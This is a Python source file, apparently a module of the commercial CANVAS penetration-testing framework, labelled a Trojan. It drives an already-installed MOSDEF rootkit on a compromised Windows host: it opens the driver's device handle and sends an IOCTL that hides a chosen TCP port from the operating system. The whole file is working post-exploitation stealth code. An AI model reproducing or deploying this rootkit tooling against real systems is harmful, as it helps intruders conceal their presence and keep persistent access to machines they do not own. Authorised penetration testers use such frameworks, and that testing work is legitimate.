#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit

# info
NAME = "hideport"
VERSION = "1.0"
DESCRIPTION = "Hides a TCP port from the view of the operating system. Needs to have the MOSDEF rootkit loaded first."
DOCUMENTATION = {}

# properties
PROPERTY={}
PROPERTY['TYPE'] = "Trojans"
PROPERTY['ARCH'] = [ ["Windows"] ]

class theexploit(canvasexploit):
    def __init__(self):
        """ init """

        canvasexploit.__init__(self)
        self.result = ""
        self.name = NAME
        self.command     = "hide_port"
        self.hideport    = None
        return

    def getArgs(self):
        """ get args """

        self.hideport = self.argsDict.get("hideport", self.hideport)
        return 

    def hidePort(self, node):
        """ call hide port through MOSDEF.sys IOCTL """

        if "win32api" in node.capabilities:
            
            if not "rootkit" in node.capabilities:
                # Test for it
                if node.shell.rootkit_present() == -1:
                    self.log("Rootkit not installed on the current host. Run loadrootkit.")
                    self.setInfo("%s - done (failed)" % NAME)
                    return 0
                    
                
            self.log("Attempting to hide port %s" %self.hideport)
                    
            # Now that we made it this far, we will attempt
            # to use the service manager to install and get
            # the rootkit running
            GENERIC_READ = 0x80000000
            GENERIC_WRITE= 0x40000000
            OPEN_EXISTING= 0x00000003
                
            file_handle = node.shell.CreateFile("\\\\.\\mosdef",GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)
            self.log("Driver file handle: %08x" % file_handle)
                
            self.log("Sending IOCTL to MOSDEF rootkit.")
            outbuffer = node.shell.malloc(0x10)
            portbuffer = str(self.hideport)
            ret = node.shell.DeviceIoControlAddress(file_handle,0x1337,portbuffer,len(portbuffer),outbuffer,0x10)
            
            if ret == 1:
                self.log("Successfully hid port: %s"%self.hideport)
            else:
                self.log("Encountered a problem, return value = %d" %ret)
                
        else:
            self.log("%s node type not supported" % node.nodetype)
            ret = 0

        return ret

    def run(self):
        """ main """
        
        self.setInfo("%s (in progress)"%(NAME))
        self.getArgs()

        for node in self.argsDict["passednodes"]:    
            ret = self.hidePort(node)

        return ret

if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."   
